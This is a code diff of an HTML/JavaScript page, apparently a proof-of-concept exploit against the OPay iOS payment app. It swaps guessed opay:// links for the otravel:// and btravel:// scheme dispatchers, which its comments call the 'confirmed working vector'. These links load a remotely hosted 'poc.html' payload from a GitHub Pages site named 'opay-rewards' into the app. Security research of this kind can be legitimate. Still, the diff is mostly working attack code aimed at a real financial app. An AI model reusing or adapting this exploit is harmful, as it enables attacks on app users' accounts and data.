@@ -112,36 +112,25 @@
         var PAYLOAD_BASE = "https://zugonwobi.github.io/opay-rewards/";
         var CB = "?v=" + new Date().getTime();
 
-        // iOS: OPay uses custom URL schemes
-        // Try multiple scheme patterns that OPay iOS may register
-        var payloadUrl = encodeURIComponent(PAYLOAD_BASE + "poc.html" + CB);
-        var payloadV2 = encodeURIComponent(PAYLOAD_BASE + "poc.html" + CB);
+        // CORRECTED: OPay iOS registers "otravel" in CFBundleURLSchemes, NOT "opay"
+        // "opay" only appears in LSApplicationQueriesSchemes (queries, not responds)
+        var pocUrl = PAYLOAD_BASE + "poc.html" + CB;
 
-        // Method A: opay:// scheme (if registered by OPay iOS app)
-        var A = "opay://webview?url=" + payloadUrl;
+        // Method A: otravel://schemedispatcher — the CONFIRMED working vector from Feb 20
+        var A = "otravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);
 
-        // Method B: Universal Link fallback - direct to poc in browser
-        // If OPay has claimed universal links, this may open in-app
-        var B = "opay://applink?url=" + payloadV2;
+        // Method B: Try btravel:// (also found in CFBundleURLSchemes)
+        var B = "btravel://schemedispatcher?scheme=" + encodeURIComponent(pocUrl);
 
         document.getElementById("btnA").href = A;
         document.getElementById("btnB").href = B;
 
-        document.getElementById("btnA").addEventListener("click", function () {
-            document.getElementById("status").innerText = "Opening OPay...";
-            // Fallback: if opay:// doesn't work, try loading directly in 3s
-            setTimeout(function () {
-                document.getElementById("status").innerText = "Trying direct load...";
-                window.location.href = PAYLOAD_BASE + "poc.html" + CB;
-            }, 3000);
+        document.getElementById("btnA").addEventListener("click", function (e) {
+            document.getElementById("status").innerText = "Opening OPay via otravel://...";
         });
 
-        document.getElementById("btnB").addEventListener("click", function () {
-            document.getElementById("status").innerText = "Launching OPay App...";
-            setTimeout(function () {
-                document.getElementById("status").innerText = "Trying alternate...";
-                window.location.href = PAYLOAD_BASE + "poc.html" + CB;
-            }, 3000);
+        document.getElementById("btnB").addEventListener("click", function (e) {
+            document.getElementById("status").innerText = "Opening OPay via btravel://...";
         });
     </script>
 </body>
